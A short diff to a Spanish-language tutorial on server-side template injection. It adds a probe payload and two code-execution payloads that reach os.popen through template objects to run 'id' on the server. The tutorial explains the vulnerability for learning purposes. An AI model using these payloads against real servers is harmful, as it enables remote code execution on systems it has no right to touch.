@@ -29,6 +29,10 @@ Supongamos que tenemos un campo de búsqueda que devuelve el siguiente HTML:
 Si se inyecta lo siguiente en el campo de búsqueda:
 
 ```txt
+${7*7}
+```
+
+```txt
 {{7*7}}
 ```
 
@@ -81,6 +85,14 @@ Lo que confirma la **vulnerabilidad SSTI**. Desde aquí, el atacante puede ir m�
 ```
 
 Esto puede conducir a ejecución de código en el servidor dependiendo del entorno.
+
+```txt
+${self.module.cache.util.os.popen("id").read()}
+```
+
+```txt
+{{self.module.cache.util.os.popen("id").read()}}
+```
 
 ---
 
